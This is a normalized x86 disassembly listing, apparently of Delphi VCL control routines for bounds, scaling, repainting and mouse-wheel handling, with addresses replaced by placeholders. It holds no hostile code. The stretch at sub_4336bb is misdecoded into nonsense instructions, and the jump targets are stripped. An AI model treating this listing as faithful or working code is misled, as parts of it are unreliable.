mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4330e0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_433104
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43312c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_433150
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_433174
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43326f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4032ec
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433276
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4139fc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4032ec
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4032ec
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413704
sub_433280
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_433db8
mov edx edi
mov eax ebx
call sub_433330
mov edx edi
mov eax ebx
call sub_434be0
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4332ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f00
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_433330
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43338c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4333b8
mov edx eax
mov ecx esp
mov eax esi
call sub_412404
mov edx esp
mov eax ebx
call sub_4337fc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4333d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_433374
mov ecx esp
mov edx esi
call sub_412404
mov edx esp
mov eax ebx
call sub_4337fc
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4333f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_433479
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433480
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
sub_433488
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4334b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4334e0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e6b4
sub_433510
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_434b3c
sub_43358c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41cddc
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41cdf8
sub_4336bb
add [ eax - 0x18 ] dl
sbb ch [ ecx ]
std
dec [ ecx + 0x9086 ]
add [ ebx + 0x3c0522c3 ] cl
aaa
inc ebx
add [ edx + 0x43373815 ] cl
add [ edx ] bh
shl [ edi + edx - 0x75 ] 0x1
add al 0x24
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test bl 0x10
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41cddc
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41cdf8
sub_433758
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4337ee
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41a064
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_433970
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042b8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4337f5
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4339a0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4337fc
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_433844
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
test esi esi
je r-xdata
mov edx ebx
call sub_436de8
mov edx ebx
mov eax esi
call sub_436d14
mov eax ebx
call sub_432fc4
sub_433890
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4032ec
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_434b3c
mov eax edi
mov si 0xffd0
call sub_4032ec
sub_433928
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4475e8
mov edx ebx
mov eax esi
call sub_419bdc
sub_43394c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_434b3c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_434b3c
pop ebx
retn
sub_433970
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4338e4
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403f9c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4338f4
sub_4339a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4339f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042b8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4339fc
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax esi
call sub_40436c
mov edx eax
mov eax ebx
call sub_43394c
sub_433a20
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41cd38
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_434b3c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41cd38
mov [ ebx + 0x84 ] eax
sub_433ba8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_433b98
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_430b40
mov eax esi
call sub_430b40
jmp r-xdata
sub_433be0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4138bc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413750
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4138dc
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_433db8
mov eax ebx
call sub_44a604
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4032ec
sub_433c60
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_433be0
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_433be0
jmp r-xdata
sub_433c84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_433d1a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433d21
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
sub_433d2c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4138bc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413860
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_433310
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433db8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433310
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a170
push eax
call InvalidateRect
push ebp
call sub_433d2c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_433e54
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44a5dc
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_434b3c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4032ec
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433eb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a170
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_433f91
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_437f7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a170
push eax
call ReleaseDC
retn
sub_434030
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax edi
call sub_434b70
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4334b4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4067cc
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_434b3c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_431cc0
sub_434104
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_434140
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43418c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4341b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_433914
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_433900
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402920
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402920
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43a170
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43429c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4342e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4032ec
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4032ec
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4343ac
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
